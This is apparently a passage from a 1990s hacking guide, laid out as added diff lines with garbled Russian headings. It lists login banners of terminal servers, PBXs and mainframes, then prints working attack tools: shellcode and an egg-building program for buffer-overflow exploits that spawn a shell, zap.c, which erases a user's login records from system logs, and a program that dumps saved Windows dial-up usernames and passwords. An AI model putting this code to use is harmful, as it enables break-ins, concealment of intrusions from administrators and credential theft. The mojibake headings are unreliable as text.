+PASSWORD =
+
+@
+
+Lantronix Terminal Server
+~~~~~~~~~~~~~~~~~~~~~~~~~
+Lantronix ETS16 Version V3.1/1(940623)
+Type HELP at the 'Local_15> ' prompt for assistance.
+
+Login password>
+
+Novell ONLAN ( Ñ´Ô ‡†°Æ‚Î · Ì‚Æ© ·®·‚•¨Æ© ‚‡•°„•‚·Ô ONLAN/PC )
+~~~~~~~~~~~~
+<Control-A>N
+
+PC-Anywhere ( Ñ´Ô ‡†°Æ‚Î · Ì‚Æ© ·®·‚•¨Æ© ‚‡•°„•‚·Ô PCAnywhere Remote )
+~~~~~~~~~~~
+<Control-A>P
+
+ROLM CBX II
+~~~~~~~~~~~
+ROLM CBXII  RELEASE 9004.2.34 RB295 9000D IBMHO27568
+BIND DATE:  7/APR/93
+COPYRIGHT 1980, 1993 ROLM COMPANY.  ALL RIGHTS RESERVED.
+ROLM IS A REGISTERED TRADEMARK AND CBX IS A TRADEMARK OF ROLM COMPANY.
+YOU HAVE ENTERED CPU 1
+12:38:47 ON WEDNESDAY 2/15/1995
+
+USERNAME: op
+PASSWORD:
+ INVALID USERNAME-PASSWORD PAIR
+
+
+ROLM-OSL
+~~~~~~~~
+MARAUDER10292  01/09/85(^G) 1 03/10/87  00:29:47
+RELEASE 8003
+OSL, PLEASE.
+?
+
+
+System75
+~~~~~~~~
+Login: root
+INCORRECT LOGIN
+
+Login: browse
+Password:
+
+Tops-10
+~~~~~~~
+NIH Timesharing
+
+NIH Tri-SMP 7.02-FF  16:30:04 TTY11
+system 1378/1381/1453 Connected to Node Happy(40) Line # 12
+Please LOGIN
+.
+
+
+VM/ESA
+~~~~~~
+VM/ESA ONLINE
+
+TBVM2 VM/ESA Rel 1.1     PUT 9200
+
+Fill in your USERID and PASSWORD and press ENTER
+(Your password will not appear when you type it)
+USERID   ===>
+PASSWORD ===>
+
+COMMAND  ===>
+
+
+Xylogics Annex Communications Server
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Annex Command Line Interpreter   *   Copyright 1991 Xylogics, Inc.
+
+Checking authorization, Please wait...
+Annex username: TNO
+Annex password:
+
+Permission granted
+annex:
+---
+
+è‡®´Æ¶•≠®• 6. è‡®¨•‡ Ø‡Æ£‡†¨¨Î §´Ô ·‡Î¢† ·‚•™†.
+
+--- begin shellcod.h ---
+/*
+ * shellcode.h
+ */
+#if defined(__i386__) && defined(__linux__)
+
+#define NOP_SIZE	1
+char nop[] = "\x90";
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+#elif defined(__sparc__) && defined(__sun__) && defined(__svr4__)
+
+#define NOP_SIZE	4
+char nop[]="\xac\x15\xa1\x6e";
+char shellcode[] =
+  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
+  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
+  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"
+  "\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08";
+
+unsigned long get_sp(void) {
+  __asm__("or %sp, %sp, %i0");
+}
+
+#elif defined(__sparc__) && defined(__sun__)
+
+#define NOP_SIZE        4
+char nop[]="\xac\x15\xa1\x6e";
+char shellcode[] =
+  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
+  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
+  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff"
+  "\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01";
+
+unsigned long get_sp(void) {
+  __asm__("or %sp, %sp, %i0");
+}
+#endif
+/*
+ * EOF
+ */--- begin eggshell.c ---
+/*
+ * eggshell v1.0
+ *
+ * Aleph One / aleph1@underground.org
+ */
+#include <stdlib.h>
+#include <stdio.h>
+#include "shellcod.h"
+
+#define DEFAULT_OFFSET                    0
+#define DEFAULT_BUFFER_SIZE             512
+#define DEFAULT_EGG_SIZE               2048
+
+void usage(void);
+
+extern char* optarg;
+
+void main(int argc, char *argv[]) {
+  char *ptr, *bof, *egg;
+  long *addr_ptr, addr;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int i, n, m, c, align=0, eggsize=DEFAULT_EGG_SIZE;
+
+  while ((c = getopt(argc, argv, "a:b:e:o:")) != EOF)
+    switch (c) {
+      case 'a':
+        align = atoi(optarg);
+        break;
+      case 'b':
+        bsize = atoi(optarg);
+        break;
+      case 'e':
+        eggsize = atoi(optarg);
+        break;
+      case 'o':
+        offset = atoi(optarg);
+        break;
+      case '?':
+        usage();
+        exit(0);
+    }
+
+  if (strlen(shellcode) > eggsize) {
+    printf("Shellcode is larger the the egg.\n");
+    exit(0);
+  }
+  if (!(bof = malloc(bsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+  if (!(egg = malloc(eggsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+
+  addr = get_sp() - offset;
+  printf("[ Buffer size:\t%d\t\tEgg size:\t%d\tAligment:\t%d\t]\n",
+    bsize, eggsize, align);
+  printf("[ Address:\t0x%x\tOffset:\t\t%d\t\t\t\t]\n", addr, offset);
+
+  addr_ptr = (long *) bof;
+  for (i = 0; i < bsize; i+=4)
+    *(addr_ptr++) = addr;
+
+  ptr = egg;
+  for (i=0; i <= eggsize - strlen(shellcode) - NOP_SIZE; i+=NOP_SIZE)
+    for (n = 0; n < NOP_SIZE; n++) {
+      m = (n + align) % NOP_SIZE;
+      *(ptr++) = nop[m];
+    }
+
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+
+  bof[bsize - 1] = '\0';
+  egg[eggsize - 1] = '\0';
+  memcpy(egg,"EGG=",4);
+  putenv(egg);
+  memcpy(bof,"BOF=",4);
+  putenv(bof);
+  system("/bin/sh");
+}
+
+void usage(void) {
+  (void)fprintf(stderr,
+    "usage: eggshell [-a <alignment>] [-b <buffersize>] \
+                                    [-e <eggsize>] [-o <offset>]\n");
+}
+---
+
+è‡®´Æ¶•≠®• 7. è‡Æ£‡†¨¨† ¨Æ§®‰®™†Ê®® log-‰†©´Æ¢ Unix.
+
+--- begin zap.c ---
+/*
+ * zap.c  Many authors, last changes by /DZh.
+ */
+#include <sys/types.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/file.h>
+#include <fcntl.h>
+#include <utmp.h>
+#include <pwd.h>
+#include <lastlog.h>
+#define WTMP_NAME "/usr/adm/wtmp"
+#define UTMP_NAME "/etc/utmp"
+#define LASTLOG_NAME "/usr/adm/lastlog"
+
+int f;
+
+void kill_utmp(char *who)
+{
+    struct utmp utmp_ent;
+    if ((f=open(UTMP_NAME,O_RDWR))>=0)
+    {
+        while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
+        if (!strncmp(utmp_ent.ut_name,who,strlen(who)))
+        {
+            bzero((char *)&utmp_ent,sizeof( utmp_ent ));
+            lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
+            write (f, &utmp_ent, sizeof (utmp_ent));
+        }
+        close(f);
+    } else printf("Can't open %s\n", UTMP_NAME );
+}
+
+void kill_wtmp(char *who)
+{
+    struct utmp utmp_ent;
+    long pos;
+    pos = 1L;
+    if ((f=open(WTMP_NAME,O_RDWR))>=0)
+    {
+        while(pos != -1L)
+        {
+            lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
+            if (read (f, &utmp_ent, sizeof (struct utmp))<0)
+            {
+                pos = -1L;
+            }
+            else
+            {
+                if (!strncmp(utmp_ent.ut_name,who,strlen(who)))
+                {
+                    bzero((char *)&utmp_ent,sizeof(struct utmp ));
+                    lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
+                    write (f, &utmp_ent, sizeof (utmp_ent));
+                    pos = -1L;
+                } else pos += 1L;
+            }
+        }
+        close(f);
+    } else printf("Can't open %s\n",WTMP_NAME);
+}
+
+void kill_lastlog(char *who)
+{
+    struct passwd *pwd;
+    struct lastlog newll;
+    if ((pwd=getpwnam(who))!=NULL)
+    {
+        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0)
+        {
+            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
+            bzero((char *)&newll,sizeof( newll ));
+            write(f, (char *)&newll, sizeof( newll ));
+            close(f);
+        } else printf("Can't open %s\n", LASTLOG_NAME);
+    } else printf("%s: ?\n",who);
+}
+
+main( int argc, char *argv[] )
+{
+    if (argc==2)
+    {
+        kill_lastlog(argv[1]);
+        kill_wtmp(argv[1]);
+        kill_utmp(argv[1]);
+        printf("Zap !\n");
+    } else
+    printf("Isage: zap <username>\n");
+}
+---
+
+è‡®´Æ¶•≠®• 8. è‡Æ£‡†¨¨† Ø‡Æ·¨Æ‚‡† ®≠‰Æ‡¨†Ê®® Dialup ·Æ•§®≠•≠®© Windows.
+
+--- begin winphone.cpp ---
+// Active user phonebook viewer with decrypted passwords :-)
+// (c) DZh, one of last day of 1998 year
+// Visual C++ note:
+//   Add rasapi32.lib into you Project/Settings/Link/Object_Modules
+#include <windows.h>
+#include <stdio.h>
+#include <ras.h>
+
+#define MAX_ENTRIES 20
+
+void main(void)
+{
+  LPRASENTRYNAME EntryArray = new (RASENTRYNAME[MAX_ENTRIES]);
+  DWORD lpcb = sizeof(RASENTRYNAME)*MAX_ENTRIES;
+  DWORD lpcEntries;
+  DWORD i, e;
+  int lpfPassword;
+  RASDIALPARAMS DialEntry;
+  RASENTRY EntryParam;
+  DWORD dwEntryInfoSize = sizeof(RASENTRY);
+
+  printf("Active phonebook:\n");
+  printf("Entry : Phone : Login/Pass\n");
+  EntryArray[0].dwSize = sizeof(RASENTRYNAME);
+  if( (e = RasEnumEntries( NULL, "", EntryArray, &lpcb,
+                                          &lpcEntries)) == 0 )
+    for(i=0;i<lpcEntries;i++)
+    {
+      strcpy(DialEntry.szEntryName, EntryArray[i].szEntryName);
+      DialEntry.dwSize = sizeof(RASDIALPARAMS);
+      RasGetEntryDialParams("", &DialEntry, &lpfPassword );
+
+      EntryParam.dwSize = sizeof(RASENTRY);
+      RasGetEntryProperties("", DialEntry.szEntryName,
+                    &EntryParam, &dwEntryInfoSize, NULL, NULL);
+
+      printf("%s : %s : %s/%s\n", DialEntry.szEntryName,
+            EntryParam.szLocalPhoneNumber,
+            DialEntry.szUserName,
+            lpfPassword==1?DialEntry.szPassword:"no_password");
+    }
+  else
+    printf("RasEnumEntries error? Code:%d\n", e);
+}
+---
+
